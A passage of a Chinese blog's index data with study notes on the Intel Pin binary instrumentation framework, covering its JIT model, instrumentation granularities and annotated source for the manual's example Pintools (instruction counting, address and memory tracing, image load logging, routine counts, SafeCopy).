","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:1:0","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"2. Instrument with Pin ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:2:0","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"1. Pin 对 Pin 的一个最合适的理解是可以将 Pin 当作一个 JIT 编译器，只是它的输入不是字节码，而是可执行文件。Pin 会拦截可执行文件的第一条指令，然后对从该指令开始的后续的指令序列重新“compile”新的代码，然后控制权限转移到新生成的代码。生成的代码与原始代码几乎一致，但是 Pin 会保证在分支退出代码序列时重新获得控制权限。重新获得控制权后，Pin 会基于分支生成更多的代码，然后继续运行。Pin 将所有生成的代码都保存在内存中，这样可以实现代码重用。 在这种 JIT 模式下，执行的是生成的代码，原始代码仅作为参考。当生成代码时，Pin 会给到用户注入自己想执行的代码（插桩）的机会。 Pin 对所有实际执行的代码进行插桩，不管代码具体处于哪个 section 。虽然对于一些条件分支会存在异常，但是如果指令没有被执行过，就一定不会被插桩。 ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:2:1","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"2. Pintools 在概念上，插桩主要包含两部分内容： 插桩机制（instrumentation code） 在什么位置插入什么样的代码 分析代码（analysis code） 在插桩点执行的代码 这两部分内容都通过 Pintool 这个可执行文件来实现。Pintool 可以看作是 Pin 中可以实现修改代码生成过程的插件。 Pintool 会向 Pin 注册插桩回调例程，每当需要生成新代码时， Pin 会调用这些回调例程。回调例程承担了检测插桩内容的作用，它会检查要生成的代码，检查其静态属性，并决定是否以及在何处注入对分析函数的调用。 分析功能收集有关应用程序的数据。Pin 确保根据需要保存和恢复整数和浮点寄存器状态，并允许将参数传递给函数。 Pintool 还可以为诸如线程创建或 fork 之类的事件注册通知回调例程，这些回调通常用于收集数据或工具初始化和清理。 因为 Pintool 采用的是类似插件的工作机制，所以必须运行在和 Pin 及插桩的可执行文件相同的地址空间内，所以 Pintool 可以访问可执行文件的全部数据，还会与可执行文件共享 fd 和其他进程信息。 在 Pintool 的开发过程中，分析代码的调优比插桩代码更重要，因为插桩代码只执行一次，但是分析代码会调用很多次。 ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:2:2","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"3. Instrumentation Granularity 1. trace instrumentation 在一个代码序列第一次执行前进行插桩，这种粒度的插桩称为“trace instrumentation”。在这种模式下，Pintool 一次“trace”执行一次检查和插桩，“trace”是指从一个 branch 开始，以一个无条件跳转 branch 结束，包含 call 和 return。 Pin 会保证每个 trace 只有一个顶部入口，但是可能包含多个出口。如果一个分支连接到了一个 trace 的中间位置，Pin 会生成一个以该分支作为开始的新的 trace 。Pin 将 trace 切分成了基本块，每个基本块称为“BBL”，每个 BBL 是一个单一入口、单一出口的指令序列。如果有分支连接到了 BBL 的中间位置，会定义一个新的 BBL 。通常以 BBL 为单位插入分析调用，而不是对每个指令都插入，这样可以降低分析调用的性能消耗。trace instrumentation 通过 TRACE_AddInstrumentFunction API 调用。 因为 Pin 是在程序执行时动态发现程序的执行流，所以 BBL 的概念与传统的基本块的概念有所不同，说明如下： swtich(i){ case 4: total++; case 3: total++; case 2: total++; case 1: total++; case 0: default: break; } 在 IA-32 架构下，会生成如下类似的指令： .L7: addl $1, -4(%ebp) .L6: addl $1, -4(%ebp) .L5: addl $1, -4(%ebp) .L4: addl $1, -4(%ebp) 传统基本块的计算方式是会把每个 addl 指令作为一个单独的指令基本块，但是对于 Pin 来说，随着执行不同的 switch cases，Pin 会在 .L7 作为入口（从 .L7 依次向下执行）的时候生成包含所有4个指令的 BBL，在 .L6 输入的时候生成包含3个指令的 BBL，依此类推。所以，在 Pin 的统计方式里，如果代码分支走到了 .L7 ，只会计算一个 Pin BBL，但是4个传统概念上的基本块都被执行了。 Pin 在遇到一些特殊指令的时候会直接作为 trace 的结束位置，生成一个 BBL， 比如 cpuid, popf 以及 REP 为前缀的指令。REP 为前缀的指令都被当作隐式循环处理，在处理完第一次的迭代后，后面的每次迭代都作为一个单独的 BBL ，因此这种情况下，会看到比传统基本块统计方式统计出更多的 BBL。 2. instruction instrumentation Pintool 会在可执行文件的每条指令都进行插桩，这种模式使得开发者不必过多关注 trace 内部的迭代循环指令，因为如上面所说，包含循环的 trace 内部的特定的 BBL 和指令可能产生多次。instruction instrumentation 通过 INS_AddInstrumentFunction API 进行调用。 3. image instrumentation 通过“caching”插桩请求实现，会有额外的内存空间要求，属于一种“提前插桩”。image instrumentation 模式下，Pintool 在 IMG:Image Object第一次加载时，对整个 imgaes 进行检查和插桩， Pintool 可以遍历 image 的 sections：SEC:Section Object， 可以是 section 中的 routine：RTN:Routine，还可以是一个 routine 中的 instructions：INS。插入位置可以是例程或指令的前面或后面，都可以实现，使用的 API 为 IMG_AddInstrumentFunction 。 image instrumentation 需要有调试信息来确定 routine 的边界，所以在调用 PIN_Init 之前，需要先初始化符号信息 PIN_InitSysmbols。 4. routine instrumentation 通过“caching”插桩请求实现，会有额外的内存空间要求，属于一种“提前插桩”。routine instrumentation 模式下，Pintool 在 image 首次加载时就对整个 routine 进行检查和插桩，对 routine 中的每条指令都可以插桩，但是没有充分的信息可以将指令划分为 BBL。插入位置可以是执行例程或指令的前后。这种模式其实更大程度上属于 image instrumentation 的替代方法，使用的 API 为 RTN_AddInstrumentFunction。 需要注意的是，在 image 和 routine instrumentation 模式下，插桩时并不确定 routine 是否会被执行，但是通过识别 routine 的开始指令，可以遍历出执行过的 routine 的指令。 ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:2:3","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"4. Symbols Pin 通过symbol object 来访问函数名， 但是 symbol 对象只能提供程序中的函数符号相关的信息，对于数据符号之类的信息必须通过其他工具获取。 Windows下，可以通过 dbghelp.dll 文件获取，但是可能出现死锁问题；Linux下可以通过 libelf.so 或 libdwarf.so 文件获取符号信息。 ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:2:4","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"3. Examples 本章主要是通过运行一些 Pin 内置的样例 Pintool，来实际感受一下 Pin 的插桩过程。实践出真知。 ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:0","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"1. Building the example tools ia32 架构的样例： $ cd source/tools/ManualExamples $ make all TARGET=ia32 ia64 架构的样例： $ cd source/tools/ManualExamples $ make all TARGET=intel64 编译并运行某个样例： $ cd source/tools/ManualExamples $ make inscount0.test TARGET=intel64 编译某个样例但不运行： $ cd source/tools/ManualExamples $ make obj-intel64/inscount0.so TARGET=intel64 # $ make obj-ia32/inscount0.so TARGET=ia32 ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:1","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"2. Simple Instruction Count （指令插桩） 功能：统计执行过的指令的总数。 运行和查看输出： $ ../../../pin -t obj-intel64/inscount0.so -o inscount.out -- /bin/ls Makefile atrace.o imageload.out itrace proccount Makefile.example imageload inscount0 itrace.o proccount.o atrace imageload.o inscount0.o itrace.out $ cat inscount.out Count 422838 # 输出文件存在默认名称，可以使用-o参数指定输出文件名。 原理：在每个指令前插入对 docount 的调用，并将结果保存在 inscount.out 文件中。 源码 source/tools/ManualExamples/inscount0.cpp： #include \u003ciostream\u003e #include \u003cfstream\u003e #include \"pin.H\" using std::cerr; using std::endl; using std::ios; using std::ofstream; using std::string; ofstream OutFile; // The running count of instructions is kept here // make it static to help the compiler optimize docount static UINT64 icount = 0; // 这里就是我们调用的桩代码 VOID docount() { icount++; } // Pin calls this function every time a new instruction is encountered // 遇到一条新指令，调用一次该函数 VOID Instruction(INS ins, VOID* v) { // Insert a call to docount before every instruction, no arguments are passed // 指定调用的桩代码函数，执行插入操作，没有对桩代码函数进行传参 INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)docount, IARG_END); } // 处理输出文件，默认文件名为“inscount.out” KNOB\u003c string \u003e KnobOutputFile(KNOB_MODE_WRITEONCE, \"pintool\", \"o\", \"inscount.out\", \"specify output file name\"); // This function is called when the application exits VOID Fini(INT32 code, VOID* v) { // Write to a file since cout and cerr maybe closed by the application // 将输出保存到文件 OutFile.setf(ios::showbase); OutFile \u003c\u003c \"Count \" \u003c\u003c icount \u003c\u003c endl; OutFile.close(); } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { cerr \u003c\u003c \"This tool counts the number of dynamic instructions executed\" \u003c\u003c endl; cerr \u003c\u003c endl \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ /* argc, argv are the entire command line: pin -t \u003ctoolname\u003e -- ... */ /* ===================================================================== */ int main(int argc, char* argv[]) { // Initialize pin 初始化 if (PIN_Init(argc, argv)) return Usage(); OutFile.open(KnobOutputFile.Value().c_str()); // Register Instruction to be called to instrument instructions // 注册插桩函数 INS_AddInstrumentFunction(Instruction, 0); // Register Fini to be called when the application exits // 注册程序退出时的处理函数 PIN_AddFiniFunction(Fini, 0); // Start the program, never returns // 开始执行 PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:2","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"3. Instruction Address Trace（指令插桩） 功能：打印执行的指令的地址 运行和查看输出： $ ../../../pin -t obj-intel64/itrace.so -- /bin/ls Makefile atrace.o imageload.out itrace proccount Makefile.example imageload inscount0 itrace.o proccount.o atrace imageload.o inscount0.o itrace.out $ head itrace.out 0x40001e90 0x40001e91 0x40001ee4 0x40001ee5 0x40001ee7 0x40001ee8 0x40001ee9 0x40001eea 0x40001ef0 0x40001ee0 $ 原理：在调用分析程序时，Pin 允许传递指令指针、寄存器当前值、内存操作的有效地址、常量等数据给分析程序。完整的可传递的参数的类型如下：IARG_TYPE。将指令计数程序中的参数更改为 INS_InsertCall 来传递即将执行的指令的地址，将 docount 更改为 printip 来打印指令的地址，最后将输出写入到文件 itrace.out 中。 源码``source/tools/ManualExamples/itrace.cpp`: #include \u003cstdio.h\u003e #include \"pin.H\" FILE* trace; // 在每条指令执行前都会被调用，打印出当前指令的地址 VOID printip(VOID* ip) { fprintf(trace, \"%p\\n\", ip); } // 遇到一条新指令调用一次 VOID Instruction(INS ins, VOID* v) { // 在每条指令前插入对 printip 函数的调用，并传递 ip 参数 INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)printip, IARG_INST_PTR, IARG_END); } // 结束函数 VOID Fini(INT32 code, VOID* v) { fprintf(trace, \"#eof\\n\"); fclose(trace); } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { PIN_ERROR(\"This Pintool prints the IPs of every instruction executed\\n\" + KNOB_BASE::StringKnobSummary() + \"\\n\"); return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { trace = fopen(\"itrace.out\", \"w\"); // 初始化 if (PIN_Init(argc, argv)) return Usage(); // 桩指令注册 INS_AddInstrumentFunction(Instruction, 0); // 结束逻辑注册 PIN_AddFiniFunction(Fini, 0); // 开始执行，不返回 PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:3","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"4. Memory Reference Trace （指令插桩） 功能：内存引用追踪（只对读写内存的指令插桩） 运行和查看输出： $ ../../../pin -t obj-intel64/pinatrace.so -- /bin/ls Makefile atrace.o imageload.o inscount0.o itrace.out Makefile.example atrace.out imageload.out itrace proccount atrace imageload inscount0 itrace.o proccount.o $ head pinatrace.out 0x40001ee0: R 0xbfffe798 0x40001efd: W 0xbfffe7d4 0x40001f09: W 0xbfffe7d8 0x40001f20: W 0xbfffe864 0x40001f20: W 0xbfffe868 0x40001f20: W 0xbfffe86c 0x40001f20: W 0xbfffe870 0x40001f20: W 0xbfffe874 0x40001f20: W 0xbfffe878 0x40001f20: W 0xbfffe87c $ 原理：Pin 中包含可以对指令进行分类和检查功能的 API，通过调用该 API 可以实现对某一类功能的函数的追踪。 源码source/tools/ManualExamples/itrace.cpp： /* * This file contains an ISA-portable PIN tool for tracing memory accesses. */ #include \u003cstdio.h\u003e #include \"pin.H\" FILE* trace; // 打印地址读的指令的地址 VOID RecordMemRead(VOID* ip, VOID* addr) { fprintf(trace, \"%p: R %p\\n\", ip, addr); } // 打印地址写的指令的地址 VOID RecordMemWrite(VOID* ip, VOID* addr) { fprintf(trace, \"%p: W %p\\n\", ip, addr); } // 使用谓词函数调用来检测内存访问 // 每个读和写的指令都会调用 VOID Instruction(INS ins, VOID* v) { // 获取指令中的内存操作数计数 UINT32 memOperands = INS_MemoryOperandCount(ins); // 遍历指令中的每个内存操作数 for (UINT32 memOp = 0; memOp \u003c memOperands; memOp++) { // 如果是内存读 if (INS_MemoryOperandIsRead(ins, memOp)) { INS_InsertPredicatedCall(ins, IPOINT_BEFORE, (AFUNPTR)RecordMemRead, IARG_INST_PTR, IARG_MEMORYOP_EA, memOp, IARG_END); } // 在某些架构下，内存操作数可以同时用作读和写，例如 IA-32 的 %eax，这种情况下只记录一次 // 如果是写 if (INS_MemoryOperandIsWritten(ins, memOp)) { INS_InsertPredicatedCall(ins, IPOINT_BEFORE, (AFUNPTR)RecordMemWrite, IARG_INST_PTR, IARG_MEMORYOP_EA, memOp, IARG_END); } } } VOID Fini(INT32 code, VOID* v) { fprintf(trace, \"#eof\\n\"); fclose(trace); } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { PIN_ERROR(\"This Pintool prints a trace of memory addresses\\n\" + KNOB_BASE::StringKnobSummary() + \"\\n\"); return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { if (PIN_Init(argc, argv)) return Usage(); trace = fopen(\"pinatrace.out\", \"w\"); // 注册桩函数 INS_AddInstrumentFunction(Instruction, 0); // 注册结束函数 PIN_AddFiniFunction(Fini, 0); // 开始，不返回 PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:4","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"5. Detecting the loading and Unloading of Images（image插桩） 功能：在 image 加载和卸载时打印信息到 trace 文件中。 执行和查看输出: $ ../../../pin -t obj-intel64/imageload.so -- /bin/ls Makefile atrace.o imageload.o inscount0.o proccount Makefile.example atrace.out imageload.out itrace proccount.o atrace imageload inscount0 itrace.o trace.out $ cat imageload.out Loading /bin/ls Loading /lib/ld-linux.so.2 Loading /lib/libtermcap.so.2 Loading /lib/i686/libc.so.6 Unloading /bin/ls Unloading /lib/ld-linux.so.2 Unloading /lib/libtermcap.so.2 Unloading /lib/i686/libc.so.6 $ 原理：本质上没有对 image 文件进行插桩。 源码 source/tools/ManualExamples/imageload.cpp： // // This tool prints a trace of image load and unload events // #include \"pin.H\" #include \u003ciostream\u003e #include \u003cfstream\u003e #include \u003cstdlib.h\u003e using std::endl; using std::ofstream; using std::string; KNOB\u003c string \u003e KnobOutputFile(KNOB_MODE_WRITEONCE, \"pintool\", \"o\", \"imageload.out\", \"specify file name\"); ofstream TraceFile; // Pin 在 image 加载时调用该函数，在该例中没有进行插桩 VOID ImageLoad(IMG img, VOID* v) { TraceFile \u003c\u003c \"Loading \" \u003c\u003c IMG_Name(img) \u003c\u003c \", Image id = \" \u003c\u003c IMG_Id(img) \u003c\u003c endl; } // Pin 在 image 卸载时调用该函数，对于将要卸载的image无法进行插桩 VOID ImageUnload(IMG img, VOID* v) { TraceFile \u003c\u003c \"Unloading \" \u003c\u003c IMG_Name(img) \u003c\u003c endl; } // This function is called when the application exits // It closes the output file. VOID Fini(INT32 code, VOID* v) { if (TraceFile.is_open()) { TraceFile.close(); } } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { PIN_ERROR(\"This tool prints a log of image load and unload events\\n\" + KNOB_BASE::StringKnobSummary() + \"\\n\"); return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { // 符号初始化 PIN_InitSymbols(); // pin 初始化 if (PIN_Init(argc, argv)) return Usage(); TraceFile.open(KnobOutputFile.Value().c_str()); // 注册加载桩函数 IMG_AddInstrumentFunction(ImageLoad, 0); // 注册卸载桩函数 IMG_AddUnloadFunction(ImageUnload, 0); // 注册退出函数 PIN_AddFiniFunction(Fini, 0); // 开始执行，无返回 PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:5","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"6. More Efficient Instruction Counting （trace 插桩） 功能：计算 BBL （单入口单出口）数量 执行和查看输出： $ ../../../pin -t obj-intel64/inscount1.so -o inscount.out -- /bin/ls Makefile atrace.o imageload.out itrace proccount Makefile.example imageload inscount0 itrace.o proccount.o atrace imageload.o inscount0.o itrace.out $ cat inscount.out Count 707208 原理：在每个 BBL 进行插桩来替代在每个指令进行插桩，在进行计数时，以 bbl 为单位，每次增加每个 bbl 中的指令数量。 源码 source/tools/ManualExamples/inscount1.cpp： #include \u003ciostream\u003e #include \u003cfstream\u003e #include \"pin.H\" using std::cerr; using std::endl; using std::ios; using std::ofstream; using std::string; ofstream OutFile; // 保存指令的运行次数，设置为静态变量以帮助编译器优化 docount static UINT64 icount = 0; // 在每个 block 前都会被调用 VOID docount(UINT32 c) { icount += c; } // Pin 在遇到一个新的block 时进行调用，插入对 docount 函数的调用 VOID Trace(TRACE trace, VOID* v) { // 访问 trace 中的每个 bbl for (BBL bbl = TRACE_BblHead(trace); BBL_Valid(bbl); bbl = BBL_Next(bbl)) { // 在每个 bbl 前插入对 docount 函数的调用，传入指令数量 BBL_InsertCall(bbl, IPOINT_BEFORE, (AFUNPTR)docount, IARG_UINT32, BBL_NumIns(bbl), IARG_END); } } KNOB\u003c string \u003e KnobOutputFile(KNOB_MODE_WRITEONCE, \"pintool\", \"o\", \"inscount.out\", \"specify output file name\"); // 退出函数 VOID Fini(INT32 code, VOID* v) { // 写入到文件中，程序可能会关闭 cout 和 cerr OutFile.setf(ios::showbase); OutFile \u003c\u003c \"Count \" \u003c\u003c icount \u003c\u003c endl; OutFile.close(); } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { cerr \u003c\u003c \"This tool counts the number of dynamic instructions executed\" \u003c\u003c endl; cerr \u003c\u003c endl \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { // 初始化 pin if (PIN_Init(argc, argv)) return Usage(); OutFile.open(KnobOutputFile.Value().c_str()); // 注册插桩函数 TRACE_AddInstrumentFunction(Trace, 0); // 注册退出函数 PIN_AddFiniFunction(Fini, 0); // 开始执行，不返回 PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:6","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"7. Procedure Instruction Count（routine插桩） 功能：计算一个 procedure 被调用的次数，以及每个 procedure 中执行的命令总数。 执行和检查输出： $ ../../../pin -t obj-intel64/proccount.so -- /bin/grep proccount.cpp Makefile proccount_SOURCES = proccount.cpp $ head proccount.out Procedure Image Address Calls Instructions _fini libc.so.6 0x40144d00 1 21 __deregister_frame_info libc.so.6 0x40143f60 2 70 __register_frame_info libc.so.6 0x40143df0 2 62 fde_merge libc.so.6 0x40143870 0 8 __init_misc libc.so.6 0x40115824 1 85 __getclktck libc.so.6 0x401157f4 0 2 munmap libc.so.6 0x40112ca0 1 9 mmap libc.so.6 0x40112bb0 1 23 getpagesize libc.so.6 0x4010f934 2 26 $ 源码 source/tools/ManualExamples/proccount.cpp： // // This tool counts the number of times a routine is executed and // the number of instructions executed in a routine // #include \u003cfstream\u003e #include \u003ciomanip\u003e #include \u003ciostream\u003e #include \u003cstring.h\u003e #include \"pin.H\" using std::cerr; using std::dec; using std::endl; using std::hex; using std::ofstream; using std::setw; using std::string; ofstream outFile; // 保存 procedure 的指令数 typedef struct RtnCount { string _name; string _image; ADDRINT _address; RTN _rtn; UINT64 _rtnCount; UINT64 _icount; struct RtnCount* _next; } RTN_COUNT; // 每个 procedure 的指令数的链表 RTN_COUNT* RtnList = 0; // 每条指令执行前调用 VOID docount(UINT64* counter) { (*counter)++; } const char* StripPath(const char* path) { const char* file = strrchr(path, '/'); if (file) return file + 1; else return path; } // Pin 在一个新的 rtn 执行时调用该函数 VOID Routine(RTN rtn, VOID* v) { // 对该routine设置一个计数器 RTN_COUNT* rc = new RTN_COUNT; // image unloaded 时， RTN 数据消失，所以在此处直接保存，后续 fini 中还要使用 rc-\u003e_name = RTN_Name(rtn); rc-\u003e_image = StripPath(IMG_Name(SEC_Img(RTN_Sec(rtn))).c_str()); rc-\u003e_address = RTN_Address(rtn); rc-\u003e_icount = 0; rc-\u003e_rtnCount = 0; // 添加到routines列表 rc-\u003e_next = RtnList; RtnList = rc; RTN_Open(rtn); // 在routine入口处插入一个call，增加call计数 RTN_InsertCall(rtn, IPOINT_BEFORE, (AFUNPTR)docount, IARG_PTR, \u0026(rc-\u003e_rtnCount), IARG_END); // 对于routine中的每条指令 for (INS ins = RTN_InsHead(rtn); INS_Valid(ins); ins = INS_Next(ins)) { // 插入对docount函数的调用，增加该rtn中的指令计数 INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)docount, IARG_PTR, \u0026(rc-\u003e_icount), IARG_END); } RTN_Close(rtn); } // 退出函数，打印每个procedure的名字和计数 VOID Fini(INT32 code, VOID* v) { outFile \u003c\u003c setw(23) \u003c\u003c \"Procedure\" \u003c\u003c \" \" \u003c\u003c setw(15) \u003c\u003c \"Image\" \u003c\u003c \" \" \u003c\u003c setw(18) \u003c\u003c \"Address\" \u003c\u003c \" \" \u003c\u003c setw(12) \u003c\u003c \"Calls\" \u003c\u003c \" \" \u003c\u003c setw(12) \u003c\u003c \"Instructions\" \u003c\u003c endl; for (RTN_COUNT* rc = RtnList; rc; rc = rc-\u003e_next) { if (rc-\u003e_icount \u003e 0) outFile \u003c\u003c setw(23) \u003c\u003c rc-\u003e_name \u003c\u003c \" \" \u003c\u003c setw(15) \u003c\u003c rc-\u003e_image \u003c\u003c \" \" \u003c\u003c setw(18) \u003c\u003c hex \u003c\u003c rc-\u003e_address \u003c\u003c dec \u003c\u003c \" \" \u003c\u003c setw(12) \u003c\u003c rc-\u003e_rtnCount \u003c\u003c \" \" \u003c\u003c setw(12) \u003c\u003c rc-\u003e_icount \u003c\u003c endl; } } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { cerr \u003c\u003c \"This Pintool counts the number of times a routine is executed\" \u003c\u003c endl; cerr \u003c\u003c \"and the number of instructions executed in a routine\" \u003c\u003c endl; cerr \u003c\u003c endl \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { PIN_InitSymbols(); outFile.open(\"proccount.out\"); if (PIN_Init(argc, argv)) return Usage(); // 注册桩函数 RTN_AddInstrumentFunction(Routine, 0); // 注册程序退出时的 fini函数 PIN_AddFiniFunction(Fini, 0); // 开始执行，不返回 PIN_StartProgram(); return 0; } 下面是一些Pin的功能性特征说明样例。 ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:7","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"8. Using PIN_SafeCopy() 功能：从源内存区域复制指定数量的字节数到目的内存区域。即使源或目的区域不可访问，此函数也可保证安全返回给caller。此外，该API还可以读写程序的内存数据。 执行和查看输出： $ ../../../pin -t obj-ia32/safecopy.so -- /bin/cp makefile obj-ia32/safecopy.so.makefile.copy $ head safecopy.out Emulate loading from addr 0xbff0057c to ebx Emulate loading from addr 0x64ffd4 to eax Emulate loading from addr 0xbff00598 to esi Emulate loading from addr 0x6501c8 to edi Emulate loading from addr 0x64ff14 to edx Emulate loading from addr 0x64ff1c to edx Emulate loading from addr 0x64ff24 to edx Emulate loading from addr 0x64ff2c to edx Emulate loading from addr 0x64ff34 to edx Emulate loading from addr 0x64ff3c to edx 源码source/tools/ManualExamples/safecopy.cpp: #include \u003cstdio.h\u003e #include \"pin.H\" #include \u003ciostream\u003e #include \u003cfstream\u003e using std::cerr; using std::endl; std::ofstream* out = 0; //======================================================= // Analysis routines //======================================================= // 从内存转移到寄存器中 ADDRINT DoLoad(REG reg, ADDRINT* addr) { *out \u003c\u003c \"Emulate loading from addr \" \u003c\u003c addr \u003c\u003c \" to \" \u003c\u003c REG_StringShort(reg) \u003c\u003c endl; ADDRINT value; PIN_SafeCopy(\u0026value, addr, sizeof(ADDRINT)); return value; } //======================================================= // Instrumentation routines //======================================================= VOID EmulateLoad(INS ins, VOID* v) { // Find the instructions that move a value from memory to a register if (INS_Opcode(ins) == XED_ICLASS_MOV \u0026\u0026 INS_IsMemoryRead(ins) \u0026\u0026 INS_OperandIsReg(ins, 0) \u0026\u0026 INS_OperandIsMemory(ins, 1)) { // op0 \u003c- *op1 INS_InsertCall(ins, IPOINT_BEFORE, AFUNPTR(DoLoad), IARG_UINT32, REG(INS_OperandReg(ins, 0)), IARG_MEMORYREAD_EA,IARG_RETURN_REGS, INS_OperandReg(ins, 0), IARG_END); // Delete the instruction INS_Delete(ins); } } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { cerr \u003c\u003c \"This tool demonstrates the use of SafeCopy\" \u003c\u003c endl; cerr \u003c\u003c endl \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int 